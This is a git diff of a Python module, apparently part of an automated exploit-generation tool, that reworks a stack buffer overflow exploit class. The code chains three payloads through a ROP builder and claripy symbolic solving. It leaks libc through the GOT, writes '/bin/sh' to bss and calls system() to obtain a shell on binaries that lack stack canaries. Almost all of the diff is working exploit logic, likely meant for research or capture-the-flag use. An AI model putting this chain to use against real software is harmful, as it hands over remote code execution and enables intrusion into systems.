@@ -72,12 +72,18 @@ class StackBufferOverflowVulnerability(Vulnerability):
             "libc": str(self.libc),
             "targetFunc": str(self.targetFunc),
             "stackOffset": str(self.stackOffset),
+            # TODO: Make these more useful / general
             "options": {
                 "sbo.suffix": str(self.suffix),
                 "sbo.initial": str(self.initial)
             }
         }
         return json.dumps(fields, indent=2)
+
+    # TODO: Make this a real thing.
+    @staticmethod
+    def requires(context, program, options):
+        return [ELF.NO_CANARY, ELF.KNOWN_MAIN, ELF.KNOWN_POP_RDI]
 
     @staticmethod
     def detect(context, function, program, options):
@@ -163,10 +169,8 @@ class StackBufferOverflowVulnerability(Vulnerability):
             conn.navigate(int(self.targetFunc["address"],16))
 
         # Payload1: leak libc location
-        prefix = b"A"*abs(self.stackOffset)
+        prefixlen = abs(self.stackOffset)
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
-        sm.prefix(prefix)
-        logger.info(sm.rop["pop rdi"])
         sm.pop_rdi(self.binary.got["gets"], target='binary') # this REQUIRES gets to be present
         # TODO: make puts a dependency
         # TODO: abstract out puts to any print
@@ -175,14 +179,8 @@ class StackBufferOverflowVulnerability(Vulnerability):
         
         logger.info("Sending first payload (to leak 'puts' location)")
        
-        # TODO: Prefix must be made symbolic
-        # TODO: cannot send conn until resolved. 
-        # something like payload1 = [symbolic bit vector length 8*stack_size, concrete_payload]
-        # So get the current output, prep the simulator, get the resulting output, get the
-        # difference, and send it to both.
         payload1 = sm.resolve(binary=0x0, libc=0x0)
-        payload1 = payload1[len(prefix):]
-        solution_payload = conn.scout(int(self.functionExit, 16), [claripy.BVS("solution_payload1", size=8*len(prefix)), claripy.BVV(payload1+b"\n")])
+        solution_payload = conn.scout(int(self.functionExit, 16), [claripy.BVS("solution_payload1", size=8*prefixlen), claripy.BVV(payload1+b"\n")])
         logger.info(f"Solution Prefix Payload: {solution_payload}")
         conn.sim_sendline(solution_payload[:-1])
         sconn.sendline(solution_payload[:-1])
@@ -217,15 +215,13 @@ class StackBufferOverflowVulnerability(Vulnerability):
         # Payload2: Psend /bin/sh
         target_heap_address = self.binary.bss() + 0x100
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
-        sm.prefix(prefix)
         sm.pop_rdi(target_heap_address)
         sm.ret("gets", "binary")
         sm.ret(function_addr, "binary")
         payload2 = sm.resolve(binary=0x0)
         
         logger.info("Sending second payload (setup write to controlled memory)")
-        payload2 = payload2[len(prefix):]
-        solution_payload = conn.scout(int(self.functionExit,16), [claripy.BVS("solution_payload2_prefix", size=8*len(prefix)), claripy.BVV(payload2+b"\n")])
+        solution_payload = conn.scout(int(self.functionExit,16), [claripy.BVS("solution_payload2_prefix", size=8*prefixlen), claripy.BVV(payload2+b"\n")])
         conn.sim_sendline(solution_payload[:-1])
         sconn.sendline(solution_payload[:-1])
         logger.info("Navigating to return.")
@@ -253,10 +249,10 @@ class StackBufferOverflowVulnerability(Vulnerability):
             conn.navigate(int(self.targetFunc["address"],16))
 
         logger.info("#####")
-        logger.info("# STACK BUFFER OVERFLOW - STAGE 3: Perform execve")
+        logger.info("# STACK BUFFER OVERFLOW - STAGE 3: Perform system invocation")
         logger.info("#####")
+
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
-        sm.prefix(prefix)
         sm.pop_rdi(target_heap_address)
         sm.nop()
         sm.ret("system", "libc")
@@ -264,8 +260,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
         payload3 = sm.resolve(binary=0x0, libc=libcoffset)
 
         logger.info("Sending final payload (invoke system('bin/sh'))")
-        payload3 = payload3[len(prefix):]
-        solution_payload = conn.scout(int(self.functionExit,16), [claripy.BVS("solution_payload_prefix3", size=8*len(prefix)), claripy.BVV(payload3+b"\n")])
+        solution_payload = conn.scout(int(self.functionExit,16), [claripy.BVS("solution_payload_prefix3", size=8*prefixlen), claripy.BVV(payload3+b"\n")])
         conn.sim_sendline(solution_payload[:-1])
         sconn.sendline(solution_payload[:-1])
         
